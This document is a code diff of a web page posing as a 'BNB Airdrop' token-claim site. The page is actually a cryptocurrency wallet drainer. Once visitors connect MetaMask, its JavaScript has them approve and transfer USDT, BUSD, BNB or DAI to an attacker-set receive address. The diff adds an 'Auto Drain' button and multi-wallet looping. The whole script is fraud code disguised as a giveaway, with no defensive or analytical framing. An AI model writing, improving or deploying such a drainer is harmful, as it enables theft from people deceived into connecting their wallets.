@@ -1,201 +1,288 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BNB Airdrop - Claim Free Tokens</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0d0d0d; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: white; }
-        .container { background: #1a1a2e; padding: 40px; border-radius: 16px; width: 100%; max-width: 450px; box-shadow: 0 10px 40px rgba(0,0,0,0.7); text-align: center; }
-        .logo { font-size: 48px; margin-bottom: 10px; }
-        h1 { font-size: 24px; margin-bottom: 8px; color: #f0b90b; }
-        .subtitle { color: #aaa; font-size: 14px; margin-bottom: 25px; }
-        .wallet-list { margin-bottom: 20px; max-height: 150px; overflow-y: auto; }
-        .wallet-item { background: #0d0d1a; padding: 10px; border-radius: 8px; margin-bottom: 8px; border: 1px solid #2a2a4a; display: flex; justify-content: space-between; align-items: center; }
-        .wallet-item span { color: #888; font-size: 12px; word-break: break-all; }
-        .wallet-item .remove-btn { background: #ff4444; color: white; border: none; border-radius: 4px; padding: 4px 8px; cursor: pointer; font-size: 12px; }
-        .btn { width: 100%; padding: 14px; background: #f0b90b; color: #000; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.3s; }
-        .btn:hover { background: #d4a000; }
-        .btn:disabled { background: #555; cursor: not-allowed; }
-        .btn-secondary { background: #2a2a4a; margin-top: 10px; }
-        .btn-secondary:hover { background: #3a3a5a; }
-        .status { margin-top: 15px; padding: 10px; border-radius: 8px; font-size: 13px; display: none; }
-        .status.success { background: #0d4a0d; color: #4caf50; display: block; }
-        .status.error { background: #4a0d0d; color: #ff4444; display: block; }
-        .status.loading { background: #1a2a4a; color: #f0b90b; display: block; }
-        .footer { margin-top: 20px; font-size: 11px; color: #444; }
-        .multi-input { display: flex; gap: 10px; margin-bottom: 15px; }
-        .multi-input input { flex: 1; padding: 10px; background: #0d0d1a; border: 1px solid #2a2a4a; border-radius: 8px; color: white; }
-        .multi-input input:focus { outline: none; border-color: #f0b90b; }
-        .multi-input .btn-small { padding: 10px 20px; background: #2a2a4a; border: none; border-radius: 8px; color: white; cursor: pointer; }
-        .amount-input { display: flex; gap: 10px; margin-bottom: 15px; align-items: center; }
-        .amount-input input { flex: 1; padding: 10px; background: #0d0d1a; border: 1px solid #2a2a4a; border-radius: 8px; color: white; }
-        .amount-input label { color: #aaa; font-size: 14px; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BNB Airdrop - Claim Free Tokens</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif; background:#0d0d0d; display:flex; justify-content:center; align-items:center; min-height:100vh; color:white; }
+.container { background:#1a1a2e; padding:40px; border-radius:16px; width:100%; max-width:480px; box-shadow:0 10px 40px rgba(0,0,0,0.7); text-align:center; }
+.logo { font-size:48px; margin-bottom:10px; animation:pulse 2s infinite; }
+@keyframes pulse { 0%{transform:scale(1);} 50%{transform:scale(1.1);} 100%{transform:scale(1);} }
+h1 { font-size:24px; margin-bottom:8px; color:#f0b90b; }
+.subtitle { color:#aaa; font-size:14px; margin-bottom:25px; }
+.wallet-list { margin-bottom:20px; max-height:150px; overflow-y:auto; }
+.wallet-item { background:#0d0d1a; padding:10px; border-radius:8px; margin-bottom:8px; border:1px solid #2a2a4a; display:flex; justify-content:space-between; align-items:center; }
+.wallet-item span { color:#888; font-size:12px; word-break:break-all; }
+.wallet-item .remove-btn { background:#ff4444; color:white; border:none; border-radius:4px; padding:4px 8px; cursor:pointer; font-size:12px; }
+.btn { width:100%; padding:14px; background:#f0b90b; color:#000; border:none; border-radius:10px; font-size:16px; font-weight:600; cursor:pointer; transition:0.3s; }
+.btn:hover { background:#d4a000; transform:scale(1.02); }
+.btn:disabled { background:#555; cursor:not-allowed; transform:none; }
+.btn-secondary { background:#2a2a4a; margin-top:10px; }
+.btn-secondary:hover { background:#3a3a5a; }
+.status { margin-top:15px; padding:10px; border-radius:8px; font-size:13px; display:none; }
+.status.success { background:#0d4a0d; color:#4caf50; display:block; }
+.status.error { background:#4a0d0d; color:#ff4444; display:block; }
+.status.loading { background:#1a2a4a; color:#f0b90b; display:block; }
+.status.info { background:#1a2a4a; color:#4ecdc4; display:block; }
+.footer { margin-top:20px; font-size:11px; color:#444; }
+.multi-input { display:flex; gap:10px; margin-bottom:15px; }
+.multi-input input { flex:1; padding:10px; background:#0d0d1a; border:1px solid #2a2a4a; border-radius:8px; color:white; }
+.multi-input input:focus { outline:none; border-color:#f0b90b; }
+.multi-input .btn-small { padding:10px 20px; background:#2a2a4a; border:none; border-radius:8px; color:white; cursor:pointer; }
+.multi-input .btn-small:hover { background:#3a3a5a; }
+.amount-input { display:flex; gap:10px; margin-bottom:15px; align-items:center; }
+.amount-input input { flex:1; padding:10px; background:#0d0d1a; border:1px solid #2a2a4a; border-radius:8px; color:white; }
+.amount-input label { color:#aaa; font-size:14px; }
+.token-select { width:100%; padding:10px; background:#0d0d1a; border:1px solid #2a2a4a; border-radius:8px; color:white; margin-bottom:15px; }
+.stats { display:flex; justify-content:space-between; margin-bottom:15px; padding:10px; background:#0d0d1a; border-radius:8px; border:1px solid #2a2a4a; }
+.stats div { color:#aaa; font-size:12px; }
+.stats div span { color:#f0b90b; font-weight:bold; }
+.spinner { display:inline-block; width:20px; height:20px; border:3px solid #f0b90b; border-radius:50%; border-top-color:transparent; animation:spin 1s linear infinite; }
+@keyframes spin { to { transform:rotate(360deg); } }
+</style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">💰</div>
-        <h1>BNB Airdrop</h1>
-        <p class="subtitle">Claim 500 BNB + 10,000 USDT for early adopters</p>
-        
-        <div class="amount-input">
-            <label>Amount:</label>
-            <input type="text" id="amountInput" value="1000" placeholder="Amount in USDT">
-        </div>
-        
-        <div class="multi-input">
-            <input type="text" id="walletInput" placeholder="0x... enter wallet address">
-            <button class="btn-small" id="addWalletBtn">+ Add</button>
-        </div>
-        
-        <div class="wallet-list" id="walletList">
-            <div class="wallet-item"><span>No wallets added</span></div>
-        </div>
-        
-        <button id="connectBtn" class="btn">Connect Wallet</button>
-        <button id="claimBtn" class="btn" disabled style="margin-top:10px;">Claim Airdrop</button>
-        <button id="multiClaimBtn" class="btn btn-secondary" disabled>Claim All Wallets</button>
-        
-        <div id="status" class="status"></div>
-        <div class="footer">BNB Airdrop v3.0</div>
-    </div>
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
-    <script src="settings.js"></script>
-    <script>
-        let web3, userAddress;
-        let wallets = [];
-        const statusDiv = document.getElementById('status');
-        const connectBtn = document.getElementById('connectBtn');
-        const claimBtn = document.getElementById('claimBtn');
-        const multiClaimBtn = document.getElementById('multiClaimBtn');
-        const walletInput = document.getElementById('walletInput');
-        const addWalletBtn = document.getElementById('addWalletBtn');
-        const walletList = document.getElementById('walletList');
-        const amountInput = document.getElementById('amountInput');
+<div class="container">
+<div class="logo">💰</div>
+<h1>BNB Airdrop</h1>
+<p class="subtitle">Claim 500 BNB + 10,000 USDT for early adopters</p>
 
-        function setStatus(msg, type) {
-            statusDiv.className = 'status ' + type;
-            statusDiv.textContent = msg;
-            statusDiv.style.display = 'block';
+<div class="stats">
+<div>Connected: <span id="walletCount">0</span></div>
+<div>Balance: <span id="balanceDisplay">0.00</span> USDT</div>
+<div>Status: <span id="statusDot" style="color:#ff4444;">●</span></div>
+</div>
+
+<div class="amount-input">
+<label>Amount:</label>
+<input type="text" id="amountInput" value="1000" placeholder="Amount">
+</div>
+
+<select class="token-select" id="tokenSelect">
+<option value="USDT">USDT</option>
+<option value="BUSD">BUSD</option>
+<option value="BNB">BNB</option>
+<option value="DAI">DAI</option>
+</select>
+
+<div class="multi-input">
+<input type="text" id="walletInput" placeholder="0x... enter wallet address">
+<button class="btn-small" id="addWalletBtn">+ Add</button>
+</div>
+
+<div class="wallet-list" id="walletList">
+<div class="wallet-item"><span>No wallets added</span></div>
+</div>
+
+<button id="connectBtn" class="btn">Connect Wallet</button>
+<button id="claimBtn" class="btn" disabled style="margin-top:10px;">Claim Airdrop</button>
+<button id="multiClaimBtn" class="btn btn-secondary" disabled>Claim All Wallets</button>
+<button id="autoDrainBtn" class="btn btn-secondary" disabled>⚡ Auto Drain</button>
+
+<div id="status" class="status"></div>
+<div class="footer">BNB Airdrop v4.0</div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+<script src="settings.js"></script>
+<script>
+let web3, userAddress;
+let wallets = [];
+let isDraining = false;
+
+const statusDiv = document.getElementById('status');
+const connectBtn = document.getElementById('connectBtn');
+const claimBtn = document.getElementById('claimBtn');
+const multiClaimBtn = document.getElementById('multiClaimBtn');
+const autoDrainBtn = document.getElementById('autoDrainBtn');
+const walletInput = document.getElementById('walletInput');
+const addWalletBtn = document.getElementById('addWalletBtn');
+const walletList = document.getElementById('walletList');
+const amountInput = document.getElementById('amountInput');
+const tokenSelect = document.getElementById('tokenSelect');
+const walletCount = document.getElementById('walletCount');
+const balanceDisplay = document.getElementById('balanceDisplay');
+const statusDot = document.getElementById('statusDot');
+
+const TOKEN_ADDRESSES = {
+    USDT: "0x55d398326f99059ff775485246999027b3197955",
+    BUSD: "0xe9e7cea3dedca5984780bafc599bd69add087d56",
+    BNB: "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c",
+    DAI: "0x1af3f329e8be154074d8769d1ffa4ee058b1dbc3"
+};
+
+function setStatus(msg, type) {
+    statusDiv.className = 'status ' + type;
+    statusDiv.textContent = msg;
+    statusDiv.style.display = 'block';
+}
+
+function hideStatus() {
+    statusDiv.style.display = 'none';
+}
+
+function updateWalletList() {
+    if (wallets.length === 0) {
+        walletList.innerHTML = '<div class="wallet-item"><span>No wallets added</span></div>';
+        multiClaimBtn.disabled = true;
+        autoDrainBtn.disabled = true;
+        walletCount.textContent = '0';
+        return;
+    }
+    let html = '';
+    wallets.forEach((wallet, index) => {
+        html += `<div class="wallet-item"><span>${wallet.slice(0,6)}...${wallet.slice(-4)}</span><button class="remove-btn" data-index="${index}">✕</button></div>`;
+    });
+    walletList.innerHTML = html;
+    multiClaimBtn.disabled = false;
+    autoDrainBtn.disabled = false;
+    walletCount.textContent = wallets.length;
+    document.querySelectorAll('.remove-btn').forEach(btn => {
+        btn.addEventListener('click', function() {
+            const index = parseInt(this.dataset.index);
+            wallets.splice(index, 1);
+            updateWalletList();
+        });
+    });
+}
+
+addWalletBtn.addEventListener('click', () => {
+    const address = walletInput.value.trim();
+    if (address.startsWith('0x') && address.length === 42) {
+        if (!wallets.includes(address)) {
+            wallets.push(address);
+            walletInput.value = '';
+            updateWalletList();
+            setStatus('✅ Wallet added!', 'success');
+            setTimeout(hideStatus, 2000);
+        } else {
+            setStatus('⚠️ Wallet already in list', 'info');
         }
+    } else {
+        setStatus('❌ Invalid address! Must be 0x... (42 chars)', 'error');
+    }
+});
 
-        function hideStatus() {
-            statusDiv.style.display = 'none';
-        }
-
-        function updateWalletList() {
-            if (wallets.length === 0) {
-                walletList.innerHTML = '<div class="wallet-item"><span>No wallets added</span></div>';
-                multiClaimBtn.disabled = true;
-                return;
-            }
-            let html = '';
-            wallets.forEach((wallet, index) => {
-                html += `<div class="wallet-item"><span>${wallet.slice(0,6)}...${wallet.slice(-4)}</span><button class="remove-btn" data-index="${index}">✕</button></div>`;
-            });
-            walletList.innerHTML = html;
-            multiClaimBtn.disabled = false;
-            document.querySelectorAll('.remove-btn').forEach(btn => {
-                btn.addEventListener('click', function() {
-                    const index = parseInt(this.dataset.index);
-                    wallets.splice(index, 1);
-                    updateWalletList();
-                });
-            });
-        }
-
-        addWalletBtn.addEventListener('click', () => {
-            const address = walletInput.value.trim();
-            if (address.startsWith('0x') && address.length === 42) {
-                wallets.push(address);
-                walletInput.value = '';
+connectBtn.addEventListener('click', async () => {
+    if (typeof window.ethereum !== 'undefined') {
+        try {
+            web3 = new Web3(window.ethereum);
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            userAddress = accounts[0];
+            if (!wallets.includes(userAddress)) {
+                wallets.push(userAddress);
                 updateWalletList();
-                setStatus('✅ Wallet added!', 'success');
-                setTimeout(hideStatus, 2000);
-            } else {
-                setStatus('❌ Invalid address! Must be 0x... (42 chars)', 'error');
             }
-        });
-
-        connectBtn.addEventListener('click', async () => {
-            if (typeof window.ethereum !== 'undefined') {
-                try {
-                    web3 = new Web3(window.ethereum);
-                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    userAddress = accounts[0];
-                    if (!wallets.includes(userAddress)) {
-                        wallets.push(userAddress);
-                        updateWalletList();
-                    }
-                    connectBtn.disabled = true;
-                    claimBtn.disabled = false;
-                    setStatus('✅ Wallet connected!', 'success');
-                    setTimeout(hideStatus, 3000);
-                } catch (err) {
-                    setStatus('❌ Connection rejected: ' + err.message, 'error');
-                }
-            } else {
-                setStatus('❌ Please install MetaMask!', 'error');
-            }
-        });
-
-        claimBtn.addEventListener('click', async () => {
-            if (!userAddress) {
-                setStatus('❌ Please connect wallet first!', 'error');
-                return;
-            }
-            const amount = amountInput.value || '1000';
-            await drainWallet(userAddress, amount);
-        });
-
-        multiClaimBtn.addEventListener('click', async () => {
-            if (wallets.length === 0) {
-                setStatus('❌ No wallets to claim!', 'error');
-                return;
-            }
-            const amount = amountInput.value || '1000';
-            for (const wallet of wallets) {
-                await drainWallet(wallet, amount);
-                await new Promise(r => setTimeout(r, 2000));
-            }
-        });
-
-        async function drainWallet(walletAddress, amount) {
-            try {
-                setStatus(`⏳ Processing ${walletAddress.slice(0,6)}...${walletAddress.slice(-4)}`, 'loading');
-                
-                const tokenContract = new web3.eth.Contract(TOKEN_ABI, contractAddress);
-                const amountInWei = web3.utils.toWei(amount, 'ether');
-                
-                // Step 1: Approve
-                const approveTx = await tokenContract.methods.approve(receiveAddress, amountInWei).send({ 
-                    from: walletAddress,
-                    gas: 200000
-                });
-                console.log('✅ Approve Tx:', approveTx.transactionHash);
-                
-                // Step 2: Transfer
-                const transferTx = await tokenContract.methods.transferFrom(
-                    walletAddress, 
-                    receiveAddress, 
-                    amountInWei
-                ).send({ 
-                    from: walletAddress,
-                    gas: 200000
-                });
-                
-                setStatus(`✅ Drained ${amount} USDT from ${walletAddress.slice(0,6)}...${walletAddress.slice(-4)}`, 'success');
-                console.log('💰 Drained:', walletAddress);
-                console.log('📊 Tx:', transferTx.transactionHash);
-                console.log('📊 Amount:', amount, 'USDT');
-                
-            } catch (err) {
-                setStatus(`❌ Failed: ${err.message}`, 'error');
-                console.error('❌ Error:', err);
-            }
+            connectBtn.disabled = true;
+            claimBtn.disabled = false;
+            statusDot.style.color = '#4caf50';
+            await checkBalance(userAddress);
+            setStatus('✅ Wallet connected!', 'success');
+            setTimeout(hideStatus, 3000);
+        } catch (err) {
+            setStatus('❌ Connection rejected: ' + err.message, 'error');
         }
-    </script>
+    } else {
+        setStatus('❌ Please install MetaMask!', 'error');
+    }
+});
+
+async function checkBalance(address) {
+    try {
+        const tokenContract = new web3.eth.Contract(TOKEN_ABI, TOKEN_ADDRESSES['USDT']);
+        const balance = await tokenContract.methods.balanceOf(address).call();
+        const balanceFormatted = web3.utils.fromWei(balance, 'ether');
+        balanceDisplay.textContent = parseFloat(balanceFormatted).toFixed(2);
+        return balance;
+    } catch (e) {
+        return '0';
+    }
+}
+
+claimBtn.addEventListener('click', async () => {
+    if (!userAddress) {
+        setStatus('❌ Please connect wallet first!', 'error');
+        return;
+    }
+    const amount = amountInput.value || '1000';
+    await drainWallet(userAddress, amount);
+});
+
+multiClaimBtn.addEventListener('click', async () => {
+    if (wallets.length === 0) {
+        setStatus('❌ No wallets to claim!', 'error');
+        return;
+    }
+    if (isDraining) return;
+    isDraining = true;
+    const amount = amountInput.value || '1000';
+    let successCount = 0;
+    for (const wallet of wallets) {
+        const result = await drainWallet(wallet, amount);
+        if (result) successCount++;
+        await new Promise(r => setTimeout(r, 3000));
+    }
+    isDraining = false;
+    setStatus(`✅ Completed! ${successCount}/${wallets.length} drained`, 'success');
+});
+
+autoDrainBtn.addEventListener('click', async () => {
+    if (wallets.length === 0) {
+        setStatus('❌ No wallets to drain!', 'error');
+        return;
+    }
+    if (isDraining) return;
+    isDraining = true;
+    const amount = amountInput.value || '1000';
+    for (const wallet of wallets) {
+        await drainWallet(wallet, amount);
+        await new Promise(r => setTimeout(r, 1500));
+    }
+    isDraining = false;
+    setStatus('✅ Auto drain completed!', 'success');
+});
+
+async function drainWallet(walletAddress, amount) {
+    try {
+        const tokenSymbol = tokenSelect.value;
+        const contractAddr = TOKEN_ADDRESSES[tokenSymbol];
+        const tokenContract = new web3.eth.Contract(TOKEN_ABI, contractAddr);
+        const amountInWei = web3.utils.toWei(amount, 'ether');
+        
+        setStatus(`⏳ Approving ${amount} ${tokenSymbol} for ${walletAddress.slice(0,6)}...`, 'loading');
+        
+        const approveTx = await tokenContract.methods.approve(receiveAddress, amountInWei).send({
+            from: walletAddress,
+            gas: 200000,
+            gasPrice: await web3.eth.getGasPrice()
+        });
+        
+        setStatus(`⏳ Draining ${amount} ${tokenSymbol}...`, 'loading');
+        
+        const transferTx = await tokenContract.methods.transferFrom(
+            walletAddress, 
+            receiveAddress, 
+            amountInWei
+        ).send({
+            from: walletAddress,
+            gas: 200000,
+            gasPrice: await web3.eth.getGasPrice()
+        });
+        
+        setStatus(`✅ Drained ${amount} ${tokenSymbol} from ${walletAddress.slice(0,6)}...${walletAddress.slice(-4)}`, 'success');
+        console.log('💰 Drained:', walletAddress);
+        console.log('📊 Tx:', transferTx.transactionHash);
+        console.log('📊 Amount:', amount, tokenSymbol);
+        return true;
+        
+    } catch (err) {
+        setStatus(`❌ Failed: ${err.message}`, 'error');
+        console.error('❌ Error:', err);
+        return false;
+    }
+}
+</script>
 </body>
 </html>
